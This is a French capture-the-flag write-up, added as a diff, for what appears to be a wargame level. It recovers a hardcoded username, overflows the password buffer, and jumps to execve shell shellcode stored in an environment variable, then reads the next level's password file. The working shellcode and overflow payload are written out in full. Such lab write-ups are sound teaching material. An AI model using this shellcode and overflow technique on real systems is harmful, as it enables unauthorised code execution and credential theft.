@@ -1,0 +1,21 @@
+
+Quand on execute le binaire, on nous demande un username puis un mot de pass.
+Quand on disass ce binaire on voit deux fonctions qui on l'air interessante : verify_user_name et verify_user_pass.
+Dans verify_user_name on voit que l'on mov dat_will dans eax. on essaye donc avec cete username, il est accepté et on nous demandes maintenant le mot de passe.
+On voit que l'input du mot de pass a un comportement inatendu a 80 caracteres, a 79 caracteres le programme nous redemande un user.
+Il n'y a aucun call system exploitable, on va donc passer par une variable d'environement pour executer un shell code :
+
+
+
+
+
+
+
+gdb level1
+start
+export SHELLCODE=`python -c 'print "\x90" * 500 + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"'`
+x/50s *((char**)environ)
+[address shellcode : 0xffffd785]
+python -c 'print "dat_will"; print "a" * 80 + "\x85\xd7\xff\xff"'  > /tmp/test1
+cat /tmp/test1 - | ./level01
+cat /home/users/level02/.pass
